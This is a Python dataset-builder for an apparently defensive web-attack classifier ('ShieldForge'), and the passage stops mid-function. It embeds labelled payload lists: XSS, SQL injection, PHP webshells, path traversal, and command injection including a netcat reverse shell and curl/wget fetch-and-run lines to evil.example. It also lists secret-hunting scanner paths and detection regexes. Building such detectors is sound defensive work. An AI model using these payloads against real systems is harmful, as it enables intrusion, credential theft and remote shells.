"""Dataset construction for the ShieldForge classifier.

Sources
-------
1. PayloadsAllTheThings (downloaded by scripts/download_data.py) for realistic
   XSS / SQLi / RCE / traversal payload strings.
2. CSIC 2010 HTTP dataset (normal + anomalous raw requests), when present.
3. Generated benign traffic and generated payload variants, so the classifier
   still has signal when the public datasets are unavailable (offline demo).

Every record is normalised to the same shape the /classify endpoint uses.
"""

from __future__ import annotations

import hashlib
import random
import re
from pathlib import Path
from typing import Any, Iterable
from urllib.parse import quote, urlsplit

from app.features import decode_layers

LABELS = ("xss", "sqli", "php_rce", "scanner", "cred_stuffing", "benign")

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36",
]

SCANNER_UAS = [
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nikto/2.5.0; https://cirt.net/)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "gobuster/3.6",
    "feroxbuster/2.10.4",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)",
    "masscan/1.3",
    "zgrab/0.x",
    "dirbuster/1.0",
    "ffuf/2.1.0",
]

BENIGN_PATHS = [
    "/",
    "/index.html",
    "/products",
    "/products/42",
    "/products/1087",
    "/category/electronics",
    "/category/home-kitchen?sort=price_asc",
    "/search?q=wireless+headphones",
    "/search?q=O%27Brien+novel",
    "/cart",
    "/checkout",
    "/account/profile",
    "/account/orders",
    "/orders/2024/123",
    "/api/v1/products?page=2&limit=24",
    "/api/v1/users/me",
    "/api/v1/orders?status=shipped",
    "/api/health",
    "/static/css/app.css",
    "/static/js/main.js",
    "/images/hero.webp",
    "/blog/2025/secure-coding-practices",
    "/blog/2025/secure-coding-practices?ref=newsletter",
    "/about",
    "/contact",
    "/login",
    "/register",
    "/terms",
    "/privacy",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/wp-content/uploads/2024/hero.jpg",
    "/assets/app.4f2c1a.js",
    "/api/v2/recommendations?user=881&limit=8",
    "/download/invoice/2025-04.pdf",
]

BENIGN_QUERY_KEYS = ["q", "page", "sort", "category", "id", "lang", "currency", "ref", "color", "size", "limit"]
BENIGN_QUERY_VALUES = [
    "shoes",
    "laptop+stand",
    "O%27Brien",
    "caf%C3%A9+table",
    "50%25+off",
    "price%3A10-50",
    "newest",
    "en-IN",
    "INR",
    "2",
    "24",
    "blue",
    "medium",
    "2025-04-19",
    "a%2Bb",
    "true",
]

BENIGN_BODIES_FORM = [
    "email=user123%40example.com&password=%5BREDACTED%5D&remember=on",
    "username=priya.sharma&password=%5BREDACTED%5D",
    "q=noise+cancelling+headphones&page=1",
    "product_id=42&quantity=2&size=medium",
    "name=Ana+Garcia&email=ana%40example.com&message=Do+you+ship+to+Spain%3F",
    "rating=5&comment=Great+product%2C+works+well.",
    "comment=Nice+%3Cb%3Ebuild%3C%2Fb%3E+quality&rating=4",
    "newsletter=1&email=reader%40example.com",
    "coupon=WELCOME10&cart_id=8f2c",
    "current_password=%5BREDACTED%5D&new_password=%5BREDACTED%5D",
]

BENIGN_BODIES_JSON = [
    '{"email":"user123@example.com","password":"[REDACTED]"}',
    '{"query":"wireless headphones","page":1,"limit":24}',
    '{"product_id":42,"quantity":2,"variant":{"color":"blue","size":"M"}}',
    '{"rating":5,"comment":"Great product, works well."}',
    '{"name":"Ana Garcia","email":"ana@example.com","message":"Do you ship to Spain?"}',
    '{"comment":"Nice <b>build</b> quality","rating":4}',
    '{"filters":{"price":{"min":10,"max":50},"brands":["acme","orbit"]},"page":2}',
]

XSS_BASE = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script src=//evil.example/x.js></script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert('XSS')>",
    "javascript:alert(1)",
    "jav&#x09;ascript:alert(1)",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "document.write('<script>alert(1)</script>')",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=javascript:alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
]

SQLI_BASE = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"\"=\"",
    "admin'--",
    "admin' #",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT username,password FROM users--",
    "1' UNION SELECT @@version,2,3--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(5000000,MD5(1))--",
    "'; DROP TABLE users;--",
    "1'; INSERT INTO users(username) VALUES('x')--",
    "1' AND 1=CAST((SELECT database()) AS int)--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
    "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
    "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
    "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "1' INTO OUTFILE '/var/www/shell.php'--",
    "1' AND pg_sleep(5)--",
    "1'; SELECT pg_read_file('/etc/passwd');--",
    "1) OR (1=1)--",
    "' OR 'a'='a",
    "%27%20OR%201%3D1--",
    "1%27%20UNION%20SELECT%20NULL--",
]

PHP_RCE_BASE = [
    "<?php system($_GET['c']); ?>",
    "<?php eval($_POST['cmd']); ?>",
    "<?php echo shell_exec($_REQUEST['c']); ?>",
    "<?php passthru('id'); ?>",
    "<?php $x=base64_decode('c3lzdGVtKCdpZCcpOw=='); $x(); ?>",
    "<?php echo file_get_contents('/etc/passwd'); ?>",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    "expect://id",
    "phar://uploads/avatar.phar/x.php",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
    ";id",
    "|id",
    "||whoami",
    "& whoami",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| nc -e /bin/sh 10.0.0.7 4444",
    "; wget http://evil.example/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh; /tmp/x.sh",
    "cmd.exe /c whoami",
    "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQA=",
    "/bin/sh -c 'curl http://evil.example/x | sh'",
    "eval($_POST['cmd'])",
    "assert($_REQUEST['cmd'])",
    "c99shell",
    "r57shell.php",
    "b374k.php",
    "WSO 2.5 shell",
]

SCANNER_PATHS = [
    "/.env",
    "/.env.local",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/wp-admin/",
    "/wp-login.php",
    "/wp-config.php.bak",
    "/xmlrpc.php",
    "/phpmyadmin/",
    "/phpMyAdmin/index.php",
    "/pma/",
    "/server-status",
    "/server-info",
    "/actuator/env",
    "/actuator/health",
    "/actuator/heapdump",
    "/console/",
    "/solr/admin/cores",
    "/cgi-bin/test.cgi",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/manager/html",
    "/jmx-console/",
    "/axis2/services",
    "/owa/auth/logon.aspx",
    "/autodiscover/autodiscover.xml",
    "/nacos/v1/auth/users",
    "/druid/index.html",
    "/trace.axd",
    "/web.config",
    "/backup.zip",
    "/backup.sql",
    "/db.sql",
    "/config.php",
    "/.DS_Store",
    "/Dockerfile",
    "/docker-compose.yml",
    "/swagger-ui/index.html",
    "/v2/api-docs",
    "/graphql",
    "/admin/",
    "/login.php",
    "/administrator/",
    "/index.php?option=com_users",
    "/?author=1",
    "/?rest_route=/wp/v2/users",
    "/shell.php",
    "/upload.php",
    "/test.php",
    "/info.php",
    "/.well-known/security.txt",
]

CRED_PATHS = ["/login", "/signin", "/sign-in", "/api/auth/login", "/api/v1/session", "/oauth/token", "/account/login"]
CRED_USERNAMES = [
    "admin",
    "administrator",
    "root",
    "test",
    "user1",
    "john.doe@example.com",
    "priya.sharma@example.com",
    "admin@example.com",
    "support@example.com",
    "no-reply@example.com",
]


# --------------------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------------------


def _rng(seed: int) -> random.Random:
    return random.Random(seed)


def _normal_session(rng: random.Random) -> dict[str, Any]:
    rate = min(40.0, max(0.2, rng.lognormvariate(1.0, 0.75)))
    return {
        "ip_change_count_5min": min(3, _poisson(rng, 0.2)),
        "ua_change_count_5min": min(2, _poisson(rng, 0.15)),
        "asn_changed": rng.random() < 0.003,
        "request_rate": round(rate, 2),
    }


def _poisson(rng: random.Random, lam: float) -> int:
    # Knuth is fine for small lambda and keeps the generator dependency-free.
    import math

    threshold = math.exp(-lam)
    k, p = 0, 1.0
    while True:
        p *= rng.random()
        if p <= threshold:
            return k
        k += 1


def _benign_response(rng: random.Random) -> dict[str, Any]:
    status = rng.choices([200, 201, 204, 302, 304, 401, 404], weights=[80, 4, 2, 5, 2, 3, 4])[0]
    weak = rng.random() < 0.03
    # Most responses do not set a cookie at all. The flags must not become a
    # proxy signal for "scanner", otherwise a benign response with no Set-Cookie
    # is misclassified.
    if rng.random() < 0.65:
        cookie_flags: dict[str, Any] = {}
    else:
        cookie_flags = {
            "present": True,
            "httponly": False if weak else True,
            "secure": False if weak else True,
            "samesite": "none" if weak else rng.choice(["lax", "strict"]),
        }
    return {
        "status_code": status,
        "content_type": rng.choice(["text/html; charset=utf-8", "application/json", "text/css", "image/webp"]),
        "cookie_flags": cookie_flags,
    }


def _normal_headers(rng: random.Random, *, referer: bool = True) -> dict[str, str]:
    headers = {
        "user-agent": rng.choice(BROWSER_UAS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": rng.choice(["en-US,en;q=0.9", "en-IN,en;q=0.8", "es-ES,es;q=0.9"]),
        "host": "shop.example.com",
    }
    if referer:
        headers["referer"] = rng.choice(
            ["https://shop.example.com/", "https://shop.example.com/search", "https://shop.example.com/products"]
        )
    return headers


def _sample(rng: random.Random, items: Iterable[Any], k: int) -> list[Any]:
    items = list(items)
    if len(items) <= k:
        return items
    return rng.sample(items, k)


def _group(*parts: str) -> str:
    blob = "|".join(str(p) for p in parts)
    return hashlib.sha1(blob.encode("utf-8", errors="replace")).hexdigest()[:16]


# --------------------------------------------------------------------------------------
# Synthetic builders
# --------------------------------------------------------------------------------------


def build_benign(rng: random.Random, count: int) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for i in range(count):
        kind = rng.choices(["get", "form", "json"], weights=[68, 20, 12])[0]
        method = "GET" if kind == "get" else "POST"
        path = rng.choice(BENIGN_PATHS)
        query = ""
        body = ""
        if kind == "get":
            if "?" in path:
                base, query = path.split("?", 1)
                path = base
            if rng.random() < 0.55:
                n = rng.randint(1, 3)
                keys = _sample(rng, BENIGN_QUERY_KEYS, n)
                values = [rng.choice(BENIGN_QUERY_VALUES) for _ in keys]
                extra = "&".join(f"{k}={v}" for k, v in zip(keys, values))
                query = f"{query}&{extra}" if query else extra
        elif kind == "form":
            body = rng.choice(BENIGN_BODIES_FORM)
        else:
            body = rng.choice(BENIGN_BODIES_JSON)

        headers = _normal_headers(rng, referer=rng.random() < 0.7)
        if kind == "json":
            headers["content-type"] = "application/json"
        elif kind == "form":
            headers["content-type"] = "application/x-www-form-urlencoded"
        # Real traffic contains truncated, bot and missing user agents. Without
        # these, short UAs get conflated with scanner signatures.
        roll = rng.random()
        if roll < 0.06:
            headers["user-agent"] = rng.choice(
                [
                    "Mozilla/5.0",
                    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                    "okhttp/4.12.0",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                ]
            )
        elif roll < 0.075:
            headers.pop("user-agent", None)

        out.append(
            {
                "method": method,
                "path": path,
                "query": query,
                "body": body,
                "headers": headers,
                "response": _benign_response(rng),
                "session": _normal_session(rng),
                "label": "benign",
                "source": "synthetic_benign",
                "group": _group("benign", str(i), path),
            }
        )
    return out


def _xss_payload(rng: random.Random) -> str:
    payload = rng.choice(XSS_BASE)
    roll = rng.random()
    if roll < 0.15:
        payload = "".join(ch.upper() if rng.random() < 0.5 else ch for ch in payload)
    elif roll < 0.3:
        payload = quote(payload, safe="")
    elif roll < 0.38:
        payload = quote(quote(payload, safe=""), safe="")
    elif roll < 0.46:
        payload = payload.replace("<", "%3C").replace(">", "%3E")
    elif roll < 0.52:
        payload = payload.replace("alert", "al\\u0065rt")
    return payload


def build_xss(rng: random.Random, count: int, pat: list[str] | None = None) -> list[dict[str, Any]]:
    pool = list(pat or []) + XSS_BASE
    out: list[dict[str, Any]] = []
    for i in range(count):
        base = rng.choice(pool)
        if rng.random() < 0.18:
            base = _xss_payload(rng)
        base = base.strip()
        if not base:
            continue
        placement = rng.choices(["query", "path", "form", "json"], weights=[58, 14, 18, 10])[0]
        method = "GET" if placement in ("query", "path") else "POST"
        path = rng.choice(["/search", "/products", "/blog", "/comment", "/profile", "/api/v1/search"])
        query = body = ""
        headers = _normal_headers(rng, referer=rng.random() < 0.5)
        if rng.random() < 0.12:
            headers["user-agent"] = rng.choice(SCANNER_UAS)
        if placement == "query":
            value = base if rng.random() < 0.7 else quote(base, safe="")
            query = f"{rng.choice(['q', 'search', 'name', 'comment'])}={value}"
        elif placement == "path":
            path = f"/{rng.choice(['search', 'product', 'user'])}/{quote(base, safe='')}"
        elif placement == "form":
            body = f"comment={quote(base, safe='')}&rating=5"
            headers["content-type"] = "application/x-www-form-urlencoded"
        else:
            escaped = base.replace("\\", "\\\\").replace('"', '\\"')
            body = '{"comment":"' + escaped + '","rating":5}'
            headers["content-type"] = "application/json"

        out.append(
            {
                "method": method,
                "path": path,
                "query": query,
                "body": body,
                "headers": headers,
                "response": _benign_response(rng),
                "session": _normal_session(rng),
                "label": "xss",
                "source": "pat" if pat and base in pat else "synthetic",
                "group": _group("xss", base.lower()),
            }
        )
    return out


def _sqli_payload(rng: random.Random) -> str:
    payload = rng.choice(SQLI_BASE)
    roll = rng.random()
    if roll < 0.18:
        payload = quote(payload, safe="")
    elif roll < 0.26:
        payload = payload.upper()
    elif roll < 0.34:
        payload = payload.replace(" ", "/**/")
    elif roll < 0.42:
        payload = quote(quote(payload, safe=""), safe="")
    return payload


def build_sqli(rng: random.Random, count: int, pat: list[str] | None = None) -> list[dict[str, Any]]:
    pool = list(pat or []) + SQLI_BASE
    out: list[dict[str, Any]] = []
    for i in range(count):
        base = rng.choice(pool)
        if rng.random() < 0.2:
            base = _sqli_payload(rng)
        base = base.strip()
        if not base:
            continue
        placement = rng.choices(["query", "path", "form", "json"], weights=[60, 8, 22, 10])[0]
        method = "GET" if placement in ("query", "path") else "POST"
        path = rng.choice(["/products", "/search", "/api/v1/orders", "/account", "/login", "/category"])
        query = body = ""
        headers = _normal_headers(rng, referer=rng.random() < 0.4)
        if rng.random() < 0.12:
            headers["user-agent"] = rng.choice(SCANNER_UAS)
        if placement == "query":
            param = rng.choice(["id", "q", "category", "user", "order"])
            query = f"{param}={quote(base, safe='')}"
        elif placement == "path":
            path = f"/api/v1/products/{quote(base, safe='')}"
        elif placement == "form":
            body = f"username=admin&password={quote(base, safe='')}"
            headers["content-type"] = "application/x-www-form-urlencoded"
        else:
            escaped = base.replace("\\", "\\\\").replace('"', '\\"')
            body = '{"username":"admin","password":"' + escaped + '"}'
            headers["content-type"] = "application/json"

        out.append(
            {
                "method": method,
                "path": path,
                "query": query,
                "body": body,
                "headers": headers,
                "response": _benign_response(rng),
                "session": _normal_session(rng),
                "label": "sqli",
                "source": "pat" if pat and base in pat else "synthetic",
                "group": _group("sqli", base.lower()),
            }
        )
    return out


def _rce_payload(rng: random.Random) -> str:
    payload = rng.choice(PHP_RCE_BASE)
    roll = rng.random()
    if roll < 0.2:
        payload = quote(payload, safe="")
    elif roll < 0.3:
        payload = quote(quote(payload, safe=""), safe="")
    elif roll < 0.4:
        payload = payload.replace("../", "..%2f")
    return payload


def build_php_rce(rng: random.Random, count: int, pat: list[str] | None = None) -> list[dict[str, Any]]:
    pool = list(pat or []) + PHP_RCE_BASE
    out: list[dict[str, Any]] = []
    for i in range(count):
        base = rng.choice(pool)
        if rng.random() < 0.18:
            base = _rce_payload(rng)
        base = base.strip()
        if not base:
            continue
        placement = rng.choices(["query", "form", "path", "json"], weights=[50, 20, 20, 10])[0]
        method = "GET" if placement in ("query", "path") else "POST"
        path = rng.choice(["/index.php", "/download", "/upload", "/api/v1/files", "/image", "/include"])
        query = body = ""
        headers = _normal_headers(rng, referer=rng.random() < 0.3)
        if rng.random() < 0.12:
            headers["user-agent"] = rng.choice(SCANNER_UAS)
        if placement == "query":
            query = f"{rng.choice(['file', 'page', 'cmd', 'url', 'path'])}={quote(base, safe='')}"
        elif placement == "path":
            path = f"/files/{quote(base, safe='')}" if not base.startswith("/") else base
        elif placement == "form":
            body = f"cmd={quote(base, safe='')}"
            headers["content-type"] = "application/x-www-form-urlencoded"
        else:
            escaped = base.replace("\\", "\\\\").replace('"', '\\"')
            body = '{"file":"' + escaped + '"}'
            headers["content-type"] = "application/json"

        out.append(
            {
                "method": method,
                "path": path[:300],
                "query": query[:600],
                "body": body[:600],
                "headers": headers,
                "response": _benign_response(rng),
                "session": _normal_session(rng),
                "label": "php_rce",
                "source": "pat" if pat and base in pat else "synthetic",
                "group": _group("php_rce", base.lower()),
            }
        )
    return out


def build_scanner(rng: random.Random, count: int) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for i in range(count):
        path = rng.choice(SCANNER_PATHS)
        if rng.random() < 0.35:
            path += rng.choice(["", "?file=../../etc/passwd", "?id=1", "?debug=1", "?path=/"])
        method = rng.choices(["GET", "HEAD", "POST", "OPTIONS"], weights=[75, 12, 8, 5])[0]
        # Real scanners spoof browser user agents; without this mix the model
        # learns "scanner == scanner UA" and misses path-only probes.
        if rng.random() < 0.5:
            ua = rng.choice(BROWSER_UAS)
        else:
            ua = rng.choice(SCANNER_UAS)
        headers = {
            "user-agent": ua,
            "accept": "*/*",
            "host": "shop.example.com",
        }
        if rng.random() < 0.08:
            headers.pop("user-agent")
        response = {"status_code": rng.choice([200, 301, 403, 404, 500]), "content_type": "text/html", "cookie_flags": {}}
        out.append(
            {
                "method": method,
                "path": path,
                "query": "",
                "body": "",
                "headers": headers,
                "response": response,
                "session": {
                    "ip_change_count_5min": 0,
                    "ua_change_count_5min": 0,
                    "asn_changed": False,
                    "request_rate": round(min(60.0, max(0.5, rng.lognormvariate(1.5, 0.8))), 2),
                },
                "label": "scanner",
                "source": "synthetic",
                "group": _group("scanner", path, method),
            }
        )
    return out


def build_cred_stuffing(rng: random.Random, count: int) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for i in range(count):
        path = rng.choice(CRED_PATHS)
        username = rng.choice(CRED_USERNAMES) if rng.random() < 0.35 else f"user{i}{rng.randint(1, 999)}"
        if rng.random() < 0.5:
            body = f"username={quote(username)}&password=%5BREDACTED%5D"
            content_type = "application/x-www-form-urlencoded"
        else:
            body = (
                '{"username":"' + username + '","password":"[REDACTED]","password_sha256":"'
                + hashlib.sha256(username.encode()).hexdigest()
                + '"}'
            )
            content_type = "application/json"

        headers = {
            "user-agent": rng.choice(BROWSER_UAS + SCANNER_UAS[:4]),
            "accept": "application/json, text/html",
            "content-type": content_type,
            "host": "shop.example.com",
        }
        if rng.random() < 0.15:
            headers["referer"] = "https://shop.example.com/login"

        out.append(
            {
                "method": "POST",
                "path": path,
                "query": "",
                "body": body,
                "headers": headers,
                "response": {
                    "status_code": rng.choice([200, 401, 429]),
                    "content_type": "application/json",
                    "cookie_flags": {"present": False},
                },
                "session": {
                    "ip_change_count_5min": min(6, _poisson(rng, 1.2)),
                    "ua_change_count_5min": min(4, _poisson(rng, 0.8)),
                    "asn_changed": rng.random() < 0.12,
                    "request_rate": round(min(600.0, max(25.0, rng.lognormvariate(4.2, 0.8))), 2),
                },
                "label": "cred_stuffing",
                "source": "synthetic",
                "group": _group("cred", path, str(i // 4)),
            }
        )
    return out


# --------------------------------------------------------------------------------------
# PayloadsAllTheThings
# --------------------------------------------------------------------------------------

_XSS_VALID = re.compile(r"<\s*[a-zA-Z]|javascript\s*:|on[a-z]+\s*=|alert\s*\(|document\.cookie|<svg|<iframe", re.I)
_SQLI_VALID = re.compile(
    r"union\s+(all\s+)?select|or\s+['\"\d]|'\s*or\s|\bsleep\s*\(|\bbenchmark\s*\(|"
    r"information_schema|drop\s+table|insert\s+into|select\s+.+\s+from|waitfor\s+delay|'\s*--",
    re.I,
)
_RCE_VALID = re.compile(
    r"php://|expect://|data://|\.\./|\.\.\\|/etc/passwd|eval\s*\(|system\s*\(|shell_exec|"
    r"base64_decode|cmd\.exe|powershell|passthru|<?php|\|\s*id\s*$|;\s*id\s*$",
    re.I,
)


def _clean_md_line(line: str) -> str:
    line = line.strip()
    line = re.sub(r"^\s*(?:[-*+]|\d+\.)\s+", "", line)
    line = line.strip("` \t")
    return line


def parse_payloads_all_the_things(directory: Path) -> dict[str, list[str]]:
    """Extract payload strings from downloaded PayloadsAllTheThings markdown files."""
    mapping = {
        "xss": ("xss.md", _XSS_VALID),
        "sqli": ("sqli.md", _SQLI_VALID),
        "php_rce": ("cmd.md", _RCE_VALID),
        "php_rce_traversal": ("traversal.md", _RCE_VALID),
        "php_rce_lfi": ("lfi.md", _RCE_VALID),
    }
    out: dict[str, list[str]] = {k: [] for k in ("xss", "sqli", "php_rce")}
    for label, (filename, validator) in mapping.items():
        path = directory / filename
        if not path.exists():
            continue
        text = path.read_text(encoding="utf-8", errors="replace")
        candidates: list[str] = []
        for block in re.findall(r"```[^\n]*\n(.*?)```", text, re.S):
            candidates.extend(block.splitlines())
        candidates.extend(
            line for line in text.splitlines() if re.match(r"^\s*(?:[-*+]|\d+\.)\s+", line)
        )
        target = "php_rce" if label.startswith("php_rce") else label
        for raw in candidates:
            line = _clean_md_line(raw)
            if not (4 <= len(line) <= 300):
                continue
            low = line.lower()
            if any(x in low for x in ("http://", "https://", "](http", "<!--", "payloadsallthethings")):
                continue
            if low.startswith(("sqlmap ", "nmap ", "curl ", "wget ", "docker ", "pip ", "git ")):
                continue
            if not validator.search(line):
                continue
            out[target].append(line)
        out[target] = list(dict.fromkeys(out[target]))
    return out


# --------------------------------------------------------------------------------------
# CSIC 2010
# --------------------------------------------------------------------------------------

_RECORD_SPLIT = re.compile(r"\n\s*\n(?=(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s)")
_XSS_ANY = re.compile(r"<\s*script|javascript\s*:|onerror\s*=|alert\s*\(|<svg|document\.cookie", re.I)
_SQLI_ANY = re.compile(
    r"union\s+(all\s+)?select|or\s+['\"\d]|'\s*or\s*['\"]?\d|\bsleep\s*\(|\bbenchmark\s*\(|"
    r"information_schema|drop\s+table|;\s*--|waitfor\s+delay|'\s*;",
    re.I,
)
_RCE_ANY = re.compile(
    r"php://|expect://|\.\./|\.\.\\|/etc/passwd|eval\s*\(|shell_exec|base64_decode|cmd\.exe|powershell",
    re.I,
)
_CRED_ANY = re.compile(r"/login|/signin|username=|password=|pwd=", re.I)


def _redact_query(query: str) -> str:
    return re.sub(
        r"(?i)\b(password|passwd|pwd|pass|token|sessionid|jsessionid|phpsessid|auth|apikey|api_key)=([^&]*)",
        r"\1=[REDACTED]",
        query,
    )


def parse_csic(path: Path, limit: int, rng: random.Random) -> list[dict[str, Any]]:
    """Parse the raw CSIC 2010 request dump into normalised records."""
    if not path.exists():
        return []
    text = path.read_text(encoding="utf-8", errors="replace")
    records = _RECORD_SPLIT.split(text)
    rng.shuffle(records)

    out: list[dict[str, Any]] = []
    for record in records:
        if len(out) >= limit:
            break
        lines = record.replace("\r\n", "\n").split("\n")
        if not lines:
            continue
        m = re.match(r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP/\d(?:\.\d)?", lines[0])
        if not m:
            continue
        method, target = m.group(1), m.group(2)
        try:
            parsed = urlsplit(target)
            path = parsed.path or "/"
            query = parsed.query
        except ValueError:
            path, query = target.split("?", 1) if "?" in target else (target, "")

        headers: dict[str, str] = {}
        body_lines: list[str] = []
        in_body = False
        for line in lines[1:]:
            if in_body:
                body_lines.append(line)
                continue
            if line.strip() == "":
                in_body = True
                continue
            if ":" in line:
                key, value = line.split(":", 1)
                key = key.strip().lower()
                if key in ("cookie", "authorization", "set-cookie"):
                    headers[key] = "[REDACTED]"
                elif key in ("user-agent", "referer", "content-type", "host", "accept"):
                    headers[key] = value.strip()
        body = _redact_query(" ".join(body_lines).strip())[:2000]

        out.append(
            {
                "method": method,
                "path": path[:500],
                "query": _redact_query(query)[:1000],
                "body": body,
                "headers": headers,
                "response": {
                    "status_code": 200,
                    "content_type": "text/html",
                    "cookie_flags": (
                        {"present": True, "httponly": True, "secure": False, "samesite": "lax"}
                        if rng.random() < 0.35
                        else {}
                    ),
                },
                "session": _normal_session(rng),
                "label": "benign",
                "source": "csic_normal",
                "group": _group("csic_normal", path, method, str(rng.random())),
            }
        )
    return out


def label_csic_anomalies(records: list[dict[str, Any]]) -> None:
    """Assign a fine-grained class to CSIC's binary 'anomalous' label."""
    for rec in records:
        text = decode_layers(" ".join([rec["path"], rec["query"], rec["body"]])).lower()
        if _XSS_ANY.search(text):
            rec["label"] = "xss"
        elif _SQLI_ANY.search(text):
            rec["label"] = "sqli"
        elif _RCE_ANY.search(text):
            rec["label"] = "php_rce"
        elif _CRED_ANY.search(text) and (
            "login" in rec["path"].lower() or "username=" in text or "password=" in text
        ):
            rec["label"] = "cred_stuffing"
            # CSIC has no session telemetry; give credential probes a plausible burst rate.
            rec["session"]["request_rate"] = 40.0
        else:
            rec["label"] = "scanner"
        rec["source"] = "csic_anomalous"
        rec["group"] = _group("csic_anomalous", rec["label"], text[:160])


# --------------------------------------------------------------------------------------
# Assembly
# --------------------------------------------------------------------------------------


def assemble(
    data_dir: Path,
    *,
    seed: int = 42,
    n_benign: int = 4500,
    n_xss: int = 3000,
    n_sqli: int = 3000,
    n_rce: int = 2800,
    n_scanner: int = 3500,
    n_cred: int = 1600,
    n_csic_normal: int = 5000,
    n_csic_anomalous: int = 5000,
) -> tuple[list[dict[str, Any]], dict[str, int]]:
    rng = _rng(seed)
    pat = parse_payloads_all_the_things(data_dir / "payloads")
    pat_counts = {k: len(v) for k, v in pat.items()}

    rows: list[dict[str, Any]] = []
    rows.extend(build_benign(rng, n_benign))
    rows.extend(build_xss(rng, n_xss, pat["xss"]))
    rows.extend(build_sqli(rng, n_sqli, pat["sqli"]))
    rows.extend(build_php_rce(rng, n_rce, pat["php_rce"]))
    rows.extend(build_scanner(rng, n_scanner))
    rows.extend(build_cred_stuffing(rng, n_cred))

    csic_normal = parse_csic(data_dir / "csic2010" / "normalTrafficTraining.txt", n_csic_normal, rng)
    csic_anom = parse_csic(data_dir / "csic2010" / "anomalousTrafficTest.txt", n_csic_anomalous, rng)
    label_csic_anomalies(csic_anom)
    rows.extend(csic_normal)
    rows.extend(csic_anom)

    # Trim each class to a predictable ceiling, keeping source diversity.
    limits = {
        "benign": n_benign + n_csic_normal,
        "xss": n_xss,
        "sqli": n_sqli,
        "php_rce": n_rce,
        "scanner": n_scanner,
        "cred_stuffing": n_cred,
    }
    by_label: dict[str, list[dict[str, Any]]] = {label: [] for label in LABELS}
    for row in rows:
        by_label[row["label"]].append(row)
    final: list[dict[str, Any]] = []
    for label, items in by_label.items():
        rng.shuffle(items)
        final.extend(items[: limits[label]])
    rng.shuffle(final)

    stats = {
        "pat_payloads": pat_counts,
        "total": len(final),
